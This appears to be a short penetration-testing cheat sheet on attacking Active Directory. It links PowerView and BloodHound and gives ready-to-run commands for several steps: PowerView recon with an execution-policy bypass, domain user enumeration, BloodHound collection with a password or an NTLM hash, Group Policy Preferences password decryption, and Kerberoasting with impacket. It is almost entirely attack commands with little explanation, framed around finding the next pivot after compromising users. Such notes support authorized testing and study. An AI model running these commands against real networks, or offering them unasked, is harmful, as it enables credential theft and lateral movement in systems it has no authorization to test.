# Attacking AD

## PowerView

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" %}

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

```powershell
powershell.exe -nop -exec bypass
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName "name"
Get-NetSession -ComputerName "DC"
```

[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)&#x20;

## User Enum

```
net user
net user /domain # enum all users in entire domain
net group /domain
```

## Bloodhound

{% embed url="https://github.com/fox-it/BloodHound.py" %}

You can use the python script in replacement of executing sharphound. Run `neo4j console` and `bloodhound`. Drag and drop the `.json` files to bloodhound, then mark a user/users you've compromised and use the `Analysis` tab to see where your next pivoting target is

### w/ hash

```python
python3 bloodhound.py -ns nameserver/dc ip 10.11.1.20 -d domain.local -u Administrator --hashes ntlm -c All
```

### w/ password

```python
python3 bloodhound.py -ns <DC IP> -d <domain> -dc <DC hostname> -u <username> -p <password> -c All
```

## Decrypting GPP Password

```
gpp-decrypt asdlkfjOLKAjlksdf/DLkjslkjf;lkj234lkasd0+
```

## Impacket Stuff

```
impacket-GetUserSPNs test.local/john:password123 -dc-ip 10.10.10.1 -request
```
